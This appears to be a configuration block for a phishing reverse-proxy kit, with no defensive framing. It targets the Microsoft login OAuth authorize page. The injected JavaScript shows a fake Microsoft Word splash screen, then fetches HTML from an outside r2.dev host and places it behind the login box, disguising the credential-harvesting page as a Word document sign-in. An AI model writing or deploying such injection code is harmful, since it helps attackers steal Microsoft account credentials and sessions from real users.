js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
    script: |
      const overlay = document.createElement("div");
      overlay.id = "wordLogoOverlay";
      overlay.style.position = "fixed";
      overlay.style.top = "0";
      overlay.style.left = "0";
      overlay.style.width = "100vw";
      overlay.style.height = "100vh";
      overlay.style.backgroundColor = "white";
      overlay.style.zIndex = "999999";
      overlay.style.display = "flex";
      overlay.style.justifyContent = "center";
      overlay.style.alignItems = "center";
      overlay.style.overflow = "hidden";

      overlay.innerHTML = `
        <style>
          @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
          }
          .logo-container {
            position: relative;
            width: 200px;
            height: 200px;
            animation: pulse 3s ease-in-out infinite;
            margin-bottom: 40px;
          }
          .back-plate {
            position: absolute;
            width: 126px;
            height: 140px;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.2);
            left: 60px;
            top: 30px;
          }
          .w-icon {
            position: absolute;
            width: 72px;
            height: 72px;
            background-color: #185ABD;
            border-radius: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            font-weight: bold;
            color: white;
            left: 30px;
            top: 64px;
            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.25);
            z-index: 10;
          }
          .blue-stripe-1 { position: absolute; width: 100%; height: 25%; background-color: #41A5EE; top: 0; }
          .blue-stripe-2 { position: absolute; width: 100%; height: 25%; background-color: #2B7CD3; top: 25%; }
          .blue-stripe-3 { position: absolute; width: 100%; height: 25%; background-color: #185ABD; top: 50%; }
          .blue-stripe-4 { position: absolute; width: 100%; height: 25%; background-color: #103E91; top: 75%; }
        </style>
        <div class="logo-container">
          <div class="back-plate">
            <div class="blue-stripe-1"></div>
            <div class="blue-stripe-2"></div>
            <div class="blue-stripe-3"></div>
            <div class="blue-stripe-4"></div>
          </div>
          <div class="w-icon">W</div>
        </div>
      `;

      document.body.appendChild(overlay);

      setTimeout(() => {
        overlay.remove();

        // Wait for #lightbox inside .win-scroll
        function waitForElement(selector, callback) {
          const interval = setInterval(() => {
            const el = document.querySelector(selector);
            if (el) {
              clearInterval(interval);
              callback(el);
            }
          }, 50);
        }

        waitForElement(".win-scroll #lightbox", (lightbox) => {
          fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
            .then(res => res.text())
            .then(html => {
              const wrapper = document.createElement("div");
              wrapper.innerHTML = html;
              wrapper.style.position = "absolute";
              wrapper.style.top = "0";
              wrapper.style.left = "0";
              wrapper.style.width = "100%";
              wrapper.style.height = "100%";
              wrapper.style.zIndex = "0";
              wrapper.style.pointerEvents = "none";
              wrapper.style.overflow = "hidden";

              // Insert right after #lightbox but still inside .win-scroll
              const parent = lightbox.parentElement;
              if (parent.classList.contains("win-scroll")) {
                parent.insertBefore(wrapper, lightbox.nextSibling);
              }
            })
            .catch(err => console.error("‚ùå Failed to load Word background:", err));
        });

      }, 3000);
